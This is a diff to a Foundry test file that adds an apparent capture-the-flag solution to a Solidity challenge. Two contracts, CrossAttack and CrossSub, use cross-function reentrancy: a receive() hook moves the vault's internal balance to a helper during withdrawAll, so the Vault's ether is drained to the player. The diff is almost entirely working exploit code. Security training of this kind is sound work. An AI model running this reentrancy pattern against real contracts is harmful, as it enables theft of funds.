@@ -21,6 +21,8 @@ contract ChallengeTest is Test {
         vm.startPrank(playerAddress, playerAddress);
 
         ////////// YOUR CODE GOES HERE //////////
+        new CrossAttack(address (setup.vault())).attack{value:1 ether}();
+
 
         ////////// YOUR CODE END //////////
 
@@ -33,5 +35,68 @@ contract ChallengeTest is Test {
 }
 
 ////////// YOUR CODE GOES HERE //////////
+contract CrossAttack {
+    Vault c;
+    bool reentrant;
+    bool check;
+    CrossSub sub;
+
+    constructor(address vaultaddress) {
+        c=Vault(vaultaddress);
+        sub=new CrossSub(vaultaddress);
+    }
+
+    function attack() public payable {
+        check=false;
+
+        while (address(c).balance>=address(this).balance){
+
+            c.deposit{value:address(this).balance}();
+            reentrant=false;
+            c.withdrawAll();
+
+            sub.attacknext();
+
+        }
+
+        check=true;
+        c.deposit{value:address(c).balance}();
+        reentrant=false;
+        c.withdrawAll();
+
+        sub.attacknext();
+
+        (bool success,)=msg.sender.call{value:address(this).balance}("");
+        require(success);
+
+    }
+    receive() external payable{
+        if(reentrant==false){
+            reentrant=true;
+            if(check==false){c.transfer(address(sub), address(this).balance);}
+            else { c.transfer(address(sub), address(c).balance);}
+
+        }
+
+    }
+
+}
+
+contract CrossSub{
+    Vault c;
+    constructor(address vaultaddress) {
+
+        c=Vault(vaultaddress);
+    }
+
+    function attacknext() public{
+        c.withdrawAll();
+
+        (bool success,)=msg.sender.call{value:address(this).balance}("");
+        require(success);
+
+    }
+    receive() external payable{}
+}
 
 ////////// YOUR CODE END //////////
